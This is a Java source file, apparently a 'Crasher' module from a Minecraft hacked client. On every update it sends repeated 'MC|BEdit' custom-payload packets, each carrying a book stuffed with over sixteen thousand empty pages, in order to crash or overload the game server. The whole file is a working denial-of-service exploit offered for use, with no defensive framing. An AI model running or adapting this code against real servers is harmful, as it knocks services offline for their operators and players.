package me.EaZy.client.modules;

import java.util.Arrays;

import de.Hero.settings.Setting;
import io.netty.buffer.Unpooled;
import me.EaZy.client.Category;
import me.EaZy.client.Module;
import me.EaZy.client.main.Client;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class Crasher extends Module {
	public static Crasher mod;
	public static final int EaZy = 2048;
	public static NBTTagList bookPages = new NBTTagList();

	public void lambdaStuff() {
		Arrays.asList(new Object[0]).stream().filter(m -> false).forEachOrdered(m -> {});
	}

	public Crasher() {
		super("Crasher", 0, "", Category.OTHER);
		Client.setmgr.rSetting(new Setting("Packets", this, 3.0f, 1.0f, 10.0f, true));
		for (int i = 0; i < 16360; i++) {
			this.bookPages.appendTag(new NBTTagString(""));
		}
		mod = this;
	}

	@Override
	public void onEnable() {
		super.onEnable();
	}

	public void onUpdate() {
		if (!this.isToggled()) {
			if (this.togglecmd) {
				this.setToggled(true);
				this.onEnable();
			}
			return;
		}
		if (this.isToggled() && !this.togglecmd) {
			this.setToggled(false);
			this.onDisable();
			return;
		}
		for (int j = 0; j < (int) Client.setmgr.getSettingByName(this, "Packets").getValFloat(); j++) {
			ItemStack bookObj = new ItemStack(Items.writable_book);
			bookObj.setTagInfo("pages", this.bookPages);
			PacketBuffer var7 = new PacketBuffer(Unpooled.buffer());
			var7.writeItemStackToBuffer(bookObj);
			Minecraft.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("MC|BEdit", var7));
		}
		super.onUpdate();
	}
}
